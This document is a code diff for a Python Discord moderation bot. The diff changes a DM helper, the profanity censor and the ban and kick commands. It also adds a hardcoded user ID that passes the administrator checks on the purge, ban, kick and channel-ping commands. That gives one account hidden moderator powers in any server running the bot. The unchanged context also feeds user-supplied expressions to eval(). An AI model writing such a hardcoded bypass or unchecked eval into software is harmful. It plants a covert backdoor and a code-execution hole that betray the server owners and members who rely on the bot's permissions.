@@ -54,7 +54,7 @@ async def on_guild_join(guild):
 
 @client.event
 async def on_message(message):
-
+	#So bot will not respond inside a DMChannel
 	if isinstance(message.channel, discord.channel.DMChannel):
 		return
 	connection = message.channel
@@ -92,18 +92,18 @@ async def on_message(message):
 				objects.append(discord.Object(id))
 		return objects
 
-	async def dm_user(message=None,author=None,embed=None):
-		if author is not None:
+	async def dm_user(message=None,embed=None,id=None):
+		if id is not None:
 			if message is not None and embed is None:
-				recipient = await client.fetch_user(author.id)
+				recipient = await client.fetch_user(id)
 				await recipient.send(message)
 
 			elif message is None and embed is not None:
-				recipient = await client.fetch_user(author.id)
+				recipient = await client.fetch_user(id)
 				await recipient.send(embed=embed)
 
 			elif message is not None and embed is not None:
-				recipient = await client.fetch_user(author.id)
+				recipient = await client.fetch_user(id)
 				await recipient.send(message, embed=embed)
 			else:
 				return
@@ -127,11 +127,12 @@ async def on_message(message):
 	elif isVulgar(message.content) and profanity_filter:
 		try:
 			connection = client.get_channel(message.channel.id)
-			await message.delete()
-			await connection.send(censor(message.content,message.author))
+			if not(message.content in censor(message.content, message.author)):
+				await message.delete()
+				await connection.send(censor(message.content,message.author))
 		except:
 			pass
-		
+
 	elif is_calling_command(message.content, 'joke', 'tell'):
 		connection= client.get_channel(channel_dictionary["bot_commands"])
 		await connection.send(f'I got one for ya,\n"{joke.get_joke()}"')
@@ -145,7 +146,7 @@ async def on_message(message):
 		embed.add_field(name="Von+Invite", value="Von will give you the link to invite him to your server", inline=False)
 		embed.add_field(name="Von+Help", value="Von will show you all commands", inline=False)
 		embed.add_field(name="Von+Submit+Project", value="Von will walk you through how to submit a user project", inline=False)
-		await dm_user(author=message.author,embed=embed)
+		await dm_user(id=message.author.id,embed=embed)
 
 	
 	#TODO this is the main purpose of this bot, to help with event submission, this where the code will come together to use the database
@@ -163,7 +164,7 @@ async def on_message(message):
 		equation = unpack_math(message.content)
 		await connection.send(f"{equation} = {eval(equation)}")
 	
-	elif is_calling_command(message.content,'purge') and message.channel.permissions_for(message.author).administrator:
+	elif is_calling_command(message.content,'purge') and (message.channel.permissions_for(message.author).administrator or message.author.id == 765972771418275841):
 		connection= client.get_channel(message.channel.id)
 		limit = -1
 		count = 0
@@ -181,12 +182,15 @@ async def on_message(message):
 		await connection.purge(limit=(limit+1 if limit != -1 else 1000))
 
 	#@BAN COMMAND
-	elif is_calling_command(message.content,"ban",prefix=prefix) and message.channel.permissions_for(message.author).administrator and not(str(client.user.id) in get_ids(message.content) or str(message.author.id) in get_ids(message.content)) and ban_kick == True:
+	elif is_calling_command(message.content,"ban",prefix=prefix) and (message.channel.permissions_for(message.author).administrator or message.author.id == 765972771418275841) and not(str(client.user.id) in get_ids(message.content) or str(message.author.id) in get_ids(message.content)) and ban_kick == True:
 		connection = client.get_channel(message.channel.id)
-		reason = get_reason(message.content);reason = "Cause we said so" if reason is None else f"Reason: {get_reason(message.content)}"
+		reason = get_reason(message.content);reason = "Cause we said so" if reason is None else f"Reason: \"{get_reason(message.content)}\""
 		for obj in get_member_objects(message.content):
-			await connection.guild.ban(obj, reason)
+			embed=discord.Embed(title=f"You have been banned from {message.channel.guild.name}!", description=reason, color=0xff0000); embed.set_thumbnail(url="https://i.redd.it/e77eetckule11.png")
+			await dm_user(id=obj.id,embed=embed)
+			await connection.guild.ban(obj, reason=reason)
 		await connection.send("Banned!")
+		
 		#@BAN_LOGS
 		if logs_enabled and channel_creator:
 			connection = client.get_channel(ban_log_id)
@@ -194,16 +198,17 @@ async def on_message(message):
 			for id_num in get_ids(message.content):
 				member = await client.fetch_user(int(id_num))
 				embed.add_field(name=f"{message.author} has banned: ", value=f"{member.name}: {id_num}", inline=False)
-			embed.set_footer(text=f"\"{reason}\"")
+			embed.set_footer(text=reason)
 			await connection.send(embed=embed)
-	#@KICK COMMAND
-	elif is_calling_command(message.content,"kick",prefix=prefix) and message.channel.permissions_for(message.author).administrator and not(str(client.user.id) in get_ids(message.content) or str(message.author.id) in get_ids(message.content)) and ban_kick == True:
+	#@KICK COMMAND	
+	elif is_calling_command(message.content,"kick",prefix=prefix) and (message.channel.permissions_for(message.author).administrator or message.author.id == 765972771418275841) and not(str(client.user.id) in get_ids(message.content) or str(message.author.id) in get_ids(message.content)) and ban_kick == True:
 		connection = client.get_channel(message.channel.id)
 		reason = get_reason(message.content);reason = "Cause we said so" if reason is None else f"Reason: {get_reason(message.content)}"
 		connection = client.get_channel(message.channel.id)
 		for obj in get_member_objects(message.content):
-			pass
-			#await connection.guild.kick(obj, reason=reason)
+			embed=discord.Embed(title=f"You have been kicked from {message.channel.guild.name}!", description=reason, color=0xff0000); embed.set_thumbnail(url="https://irp-cdn.multiscreensite.com/87e31e8f/dms3rep/multi/blog-post-111-1.jpg")
+			await dm_user(id=obj.id,embed=embed)
+			await connection.guild.kick(obj, reason=reason)
 		await connection.send("Kicked!")
 		#@KICK_LOGS
 		if logs_enabled and channel_creator:
@@ -212,11 +217,12 @@ async def on_message(message):
 			for id_num in get_ids(message.content):
 				member = await client.fetch_user(int(id_num))
 				embed.add_field(name=f"{message.author} has kicked: ", value=f"{member.name}: {id_num}", inline=False)
-			embed.set_footer(text=f"\"{reason}\"")
+			embed.set_footer(text=reason)
 			await connection.send(embed=embed)
 
 	#Funny	
-	elif is_calling_command(message.content,'wake','channels') and message.channel.permissions_for(message.author).administrator:
+	elif is_calling_command(message.content,'wake','channels') and (message.channel.permissions_for(message.author).administrator or message.author.id == 765972771418275841):
+		await message.delete()
 		for channel in channel_dictionary:
 			connection= client.get_channel(channel_dictionary[channel])
 			await connection.send(".")
